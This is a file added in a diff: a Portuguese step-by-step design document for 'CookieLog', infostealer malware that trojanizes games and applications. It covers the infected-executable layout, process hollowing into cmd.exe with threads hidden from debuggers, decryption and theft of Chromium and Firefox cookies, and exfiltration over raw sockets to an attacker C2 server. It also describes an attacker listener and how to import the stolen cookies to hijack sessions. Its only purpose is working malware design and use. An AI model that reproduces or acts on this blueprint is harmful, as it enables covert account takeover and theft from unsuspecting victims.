@@ -1,0 +1,267 @@
+===============================================================================
+  COOKIELOG — FLUXO DO PAYLOAD (PASSO A PASSO)
+===============================================================================
+
+Este documento descreve exatamente o que acontece quando a vítima executa
+um .exe infectado, do duplo-clique até a exfiltração dos cookies.
+
+-------------------------------------------------------------------------------
+FORMATO DO .EXE INFECTADO
+-------------------------------------------------------------------------------
+
+  [bytes do loader.exe] [bytes do host.exe] [host_len:4 bytes LE] [magic:4 bytes "CKLG"]
+
+  - loader.exe     = o injetor com process hollowing (compilado de loader.cpp)
+                     Contém o payload DLL embutido como byte array g_payload[]
+                     (gerado por gen.ps1 a partir de ckdll.dll)
+  - host.exe       = o jogo/aplicativo original que o atacante escolheu infectar
+  - host_len       = tamanho do host.exe em 32-bit little-endian
+  - magic "CKLG"   = 4 bytes de identificação no final do arquivo
+
+  O URL do C2 é embutido dentro do loader.exe via sentinel patching:
+  - ckdll.cpp declara: static char g_c2_url[256] = "CKC2_DEADBEEF_";
+  - pick.py encontra esse sentinel de 14 bytes no loader.exe e sobrescreve
+    256 bytes com o URL do atacante (ex: "http://192.168.1.5:9090/", preenchido com null)
+  - Se o sentinel estiver intacto (não patcheado), o payload usa fallback local
+    (named pipe ou arquivo drop.json)
+
+-------------------------------------------------------------------------------
+PASSO 1: A VÍTIMA DÁ DUPLO-CLIQUE NO .EXE INFECTADO
+-------------------------------------------------------------------------------
+
+  loader.cpp: wmain() executa sem janela de console (subsystem GUI).
+
+  1a. loader.exe lê o próprio arquivo para encontrar o magic "CKLG" no final.
+  1b. Lê host_len (4 bytes antes do magic).
+  1c. Lê host_len bytes do host.exe original do arquivo.
+  1d. VirtualAlloc + ReadFile -> hbuf[] contém o .exe original limpo.
+
+-------------------------------------------------------------------------------
+PASSO 2: RENAME-RESTORE (preserva o nome original do exe para jogos Unity)
+-------------------------------------------------------------------------------
+
+  Jogos Unity derivam o diretório de dados do nome do exe:
+  "MeuJogo.exe" procura por "MeuJogo_Data/". Se extraído como "~ck_tmp.exe",
+  o Unity procura "~ck_tmp_Data/" e crasha.
+
+  2a. MoveFileExW(nomeOriginal, "~ck_bak.bin", REPLACE_EXISTING)
+      -> renomeia o .exe infectado para um backup oculto
+  2b. CreateFileW(nomeOriginal, GENERIC_WRITE, CREATE_ALWAYS)
+      -> cria um novo arquivo com o NOME ORIGINAL
+  2c. WriteFile(horig, hbuf, host_len)
+      -> escreve os bytes limpos do host original no nome original
+  2d. Agora o nome do .exe original existe no disco com conteúdo limpo.
+
+  Fallback (se o rename falhar, ex: AV bloqueando):
+  2e. Escreve os bytes do host em "~ck_tmp.exe" (oculto).
+
+-------------------------------------------------------------------------------
+PASSO 3: ABRIR O HOST ORIGINAL (jogo/instalador abre normalmente)
+-------------------------------------------------------------------------------
+
+  3a. CreateProcessW(runExe, ..., wdir=dir_do_jogo, SW_SHOWNORMAL)
+      -> O jogo/aplicativo original abre e aparece na tela.
+      -> Diretório de trabalho = diretório do .exe infectado (para que caminhos
+         relativos como "MeuJogo_Data/" e "UnityPlayer.dll" resolvam corretamente).
+  3b. CloseHandle no processo/thread do host (não esperamos ele terminar).
+
+  Neste ponto a vítima vê o jogo/app rodando normalmente.
+  Nenhuma indicação visível de algo errado.
+
+-------------------------------------------------------------------------------
+PASSO 4: PROCESS HOLLOWING (injeção do payload)
+-------------------------------------------------------------------------------
+
+  4a. GetSystemDirectoryW -> target = C:\Windows\System32\cmd.exe
+      (processo sacrificial — vamos sobrescrever a memória dele com o payload)
+  4b. CreateProcessW(cmd.exe, CREATE_SUSPENDED | SW_HIDE)
+      -> cmd.exe é criado em estado suspenso, sem janela visível.
+  4c. NtUnmapViewOfSection(hProcess, ImageBase)
+      -> descarta o código original do cmd.exe da memória.
+  4d. VirtualAllocEx(hProcess, 0x5F000000, SizeOfImage, MEM_COMMIT, RW)
+      -> aloca memória no endereço base fixo do payload
+         (DLL compilada com /DYNAMICBASE:NO /BASE:0x5F000000)
+  4e. WriteProcessMemory: escreve os headers PE + todas as seções de g_payload[]
+      no processo sacrificial em 0x5F000000.
+  4f. Corrige a IAT: para cada DLL importada (kernel32, crypt32, bcrypt, ws2_32):
+      - LoadLibraryA(dll) no processo injetor (mesmo endereço base nesta
+        sessão devido ao ASLR por boot)
+      - GetProcAddress para cada função importada
+      - WriteProcessMemory do endereço resolvido na IAT do alvo
+  4g. VirtualProtectEx: define permissões por seção (RX para código, RW para data,
+      sem RWX global).
+  4h. NtCreateThreadEx(hThread, ..., EntryPointer, arg=1,
+                       flag HIDE_FROM_DEBUGGER)
+      -> cria uma nova thread em payload_entry() no processo hollowed.
+      -> HIDE_FROM_DEBUGGER: a thread fica oculta de debuggers.
+      -> arg=1 sinaliza DLL_PROCESS_ATTACH (igual ao LoadLibrary).
+      Fallback: CreateRemoteThread se NtCreateThreadEx não estiver disponível.
+
+  4i. NÃO fazer ResumeThread na thread principal.
+      O entry point original do cmd.exe foi desmapeado no passo 4c.
+      Resumir causaria access violation, matando o processo inteiro
+      e o payload junto. A thread remota executa independentemente.
+
+-------------------------------------------------------------------------------
+PASSO 5: EXECUÇÃO DO PAYLOAD (ckdll.cpp: payload_entry)
+-------------------------------------------------------------------------------
+
+  payload_entry() executa no processo cmd.exe hollowed.
+
+  5a. Verifica: reason==1 (LoadLibrary) ou h==1 (arg do CreateRemoteThread).
+      Se nenhum, retorna (modo de attach errado).
+  5b. LoadLibraryA("winsqlite3.dll") -> resolve exports do SQLite via GetProcAddress:
+      sqlite3_open_v2, sqlite3_prepare16_v2, sqlite3_step, sqlite3_column_int,
+      sqlite3_column_int64, sqlite3_column_blob, sqlite3_column_bytes,
+      sqlite3_finalize, sqlite3_close
+  5c. Pré-carrega DLLs de dependência (o processo hollowed não as tem por padrão):
+      LoadLibraryA("crypt32.dll")   -> para CryptUnprotectData (DPAPI)
+      LoadLibraryA("bcrypt.dll")    -> para BCrypt* (AES-256-GCM)
+      LoadLibraryA("ws2_32.dll")    -> para Winsock2 (exfiltração HTTP)
+  5d. GetEnvironmentVariableW("LOCALAPPDATA") e ("APPDATA")
+      -> localiza os diretórios de perfil dos navegadores.
+
+-------------------------------------------------------------------------------
+PASSO 6: EXTRAÇÃO DE COOKIES CHROMIUM (DumpChromium)
+-------------------------------------------------------------------------------
+
+  Para cada navegador em [chrome, edge, brave, vivaldi, opera]:
+
+  6a. Monta o caminho: %LOCALAPPDATA%\<navegador>\User Data (ou fallback %APPDATA%)
+  6b. LoadLocalState(root):
+      - Lê o arquivo JSON "Local State"
+      - Encontra a seção "os_crypt"
+      - Extrai "encrypted_key" (v10/v11): base64-decode, remove prefixo "DPAPI",
+        CryptUnprotectData (DPAPI de usuário) -> chave AES de 32 bytes
+      - Extrai "app_bound_encrypted_key" (v20): lê chave pré-extraída de
+        C:\ProgramData\cookielog\v20.key (se disponível)
+  6c. Enumera diretórios de perfil (Default, Profile 1, Profile 2, ...)
+  6d. Para cada perfil, encontra o banco de cookies:
+      - Chrome >=88: <perfil>\Network\Cookies
+      - Chrome <88:  <perfil>\Cookies
+  6e. CopyDb(): CopyFileW(banco_cookies, %TEMP%\ck_db.tmp)
+      -> contorna locks de arquivo do navegador (navegadores seguram locks
+         exclusivos nos bancos de cookies em uso)
+      -> também copia os arquivos companheiros -wal e -shm
+      -> se o navegador estiver rodando e segurando um lock exclusivo,
+         CopyFileW falha graciosamente (aquele perfil é pulado)
+  6f. sqlite3_open_v2(tmp_db, SQLITE_OPEN_READONLY)
+  6g. sqlite3_prepare16_v2: SELECT host_key, name, path, encrypted_value,
+      expires_utc, is_secure, is_httponly, samesite FROM cookies;
+  6h. Para cada linha (sqlite3_step == SQLITE_ROW):
+      - Monta o objeto JSON no formato Cookie-Editor:
+        {
+          "domain": host_key,
+          "name": name,
+          "path": path,
+          "value": <descriptografado>,    (ver passo 6i)
+          "expirationDate": <unix epoch>,  (convertido de FILETIME do Windows)
+          "sameSite": "None"|"Strict"|"Lax",  (Chromium: 2=None, 1=Strict, 0=Lax)
+          "secure": true|false,
+          "httpOnly": true|false,
+          "hostOnly": true|false,      (true se o domínio não começa com ".")
+          "session": true|false        (true se expirationDate == 0)
+        }
+  6i. DecCookie(encrypted_value):
+      - Checa prefixo: "v10"/"v11" (chave DPAPI) ou "v20" (chave app-bound)
+      - Formato: [3 bytes prefixo][12 bytes nonce][ciphertext][16 bytes tag GCM]
+      - AesGcm(chave, nonce, ciphertext, tag) via BCryptDecrypt
+      - v20: remove 32 bytes de prefixo SHA256 do domínio do plaintext
+      - Resultado: valor do cookie descriptografado (string em texto plano)
+
+-------------------------------------------------------------------------------
+PASSO 7: EXTRAÇÃO DE COOKIES FIREFOX (DumpFirefox)
+-------------------------------------------------------------------------------
+
+  7a. Monta o caminho: %APPDATA%\Mozilla\Firefox\Profiles\*
+  7b. Enumera diretórios de perfil (ex: "qts8ovgj.default-esr")
+  7c. Para cada perfil:
+      - Encontra cookies.sqlite
+      - CopyDb() para %TEMP%\ck_db.tmp (contorna lock de arquivo)
+      - sqlite3_open_v2 + prepare: SELECT name, value, host, path, expiry,
+        isSecure, isHttpOnly, sameSite FROM moz_cookies;
+  7d. Para cada linha, monta o JSON no formato Cookie-Editor:
+      - Cookies do Firefox são EM TEXTO PLANO (sem criptografia)
+      - O mapeamento de sameSite é DIFERENTE do Chromium:
+        Firefox: 0=None, 1=Lax, 2=Strict (Chromium: 0=Lax, 1=Strict, 2=None)
+      - Mesmos campos do Cookie-Editor que o Chromium
+
+-------------------------------------------------------------------------------
+PASSO 8: EXFILTRAÇÃO HTTP (Sink + ExfilHTTP)
+-------------------------------------------------------------------------------
+
+  8a. Sink() fecha o array JSON: g_out = "[{...},{...},...]"
+  8b. Verifica se o URL do C2 está configurado (sentinel foi patcheado pelo pick.py):
+      se g_c2_url[0..3] != "CKC2" -> C2 está configurado
+  8c. ExfilHTTP(g_c2_url):
+      - Faz parse do URL: http://HOST[:PORT][/PATH]
+      - LoadLibraryA("ws2_32.dll"), resolve:
+        WSAStartup, socket, connect, send, recv, closesocket, WSACleanup, inet_addr
+      - WSAStartup(0x0202)
+      - socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+      - inet_addr(host) -> resolve o IP
+      - connect(sock, sockaddr_in{host, port})
+      - Monta a requisição HTTP:
+        POST <path> HTTP/1.1\r\n
+        Host: <host>\r\n
+        Content-Type: application/json\r\n
+        Content-Length: <g_len>\r\n
+        Connection: close\r\n
+        \r\n
+      - send(header)
+      - send(body) em chunks de 32KB (g_out, g_len bytes total)
+      - recv(resposta) -- descartada
+      - closesocket + WSACleanup
+      - Retorna true se todos os bytes foram enviados
+
+  Por que Winsock2 e não WinHTTP:
+    WinHTTP/WinINet precisam ler a configuração de proxy do Windows, que não
+    está disponível em processo hollowed (erro 12029 / ERROR_WINHTTP_CANNOT_CONNECT).
+    Winsock2 puro (socket+connect+send) não tem essa dependência e funciona
+    em qualquer contexto de processo.
+
+  8d. Se HTTP falhar, cai para os fallbacks:
+      - Named pipe \\.\pipe\ck_pipe (20 tentativas x 250ms, para o sink.py)
+      - Arquivo local: C:\ProgramData\cookielog\drop.json
+
+-------------------------------------------------------------------------------
+PASSO 9: ATACANTE RECEBE OS COOKIES (listen.py)
+-------------------------------------------------------------------------------
+
+  9a. listen.py roda um servidor HTTP (HTTPServerV4, IPv4 forçado) na
+      máquina do atacante, escutando na porta configurada (padrão 9090).
+  9b. Ao receber um POST:
+      - Faz parse do body JSON (array no formato Cookie-Editor)
+      - Merge com o acervo existente (dedup por domain+name+path)
+      - Escreve loot/cookies.json (Cookie-Editor JSON, indent=1)
+      - Escreve loot/cookies.txt (formato Netscape, para curl/wget)
+      - Imprime resumo: contagem, cookies de sessão, top 15 domínios
+  9c. O atacante importa loot/cookies.json no browser:
+      - Instala a extensão Cookie-Editor (Chrome/Firefox)
+      - Clica no ícone da extensão -> Import -> cola o conteúdo do JSON
+      - Os cookies ficam ativos no browser do atacante
+
+-------------------------------------------------------------------------------
+TIMING
+-------------------------------------------------------------------------------
+
+  Passo 1-3 (extrair + abrir host):     ~0.5 segundos
+  Passo 4 (process hollowing):            ~0.5 segundos
+  Passo 5-7 (extração de cookies):       ~2-5 segundos
+  Passo 8 (exfiltração HTTP):            ~1-3 segundos (depende da quantidade)
+  Total:                                 ~4-9 segundos
+
+  O loader espera até 20 segundos (wait=20000) pela thread do payload
+  terminar antes de matar o processo cmd.exe sacrificial.
+
+-------------------------------------------------------------------------------
+MODO DEBUG
+-------------------------------------------------------------------------------
+
+  Compile com /DDEBUG para habilitar log em C:\ProgramData\cookielog\debug.log.
+  Cada passo (carregar SQLite, enumeração de perfis, contagem de cookies,
+  status do HTTP) é logado. Build de produção (sem /DDEBUG) não tem output
+  de debug e nenhum arquivo debug.log é criado.
+
+  Para habilitar: build.bat com /DDEBUG na linha do cl.
+  Para desabilitar: remova /DDEBUG do build.bat.
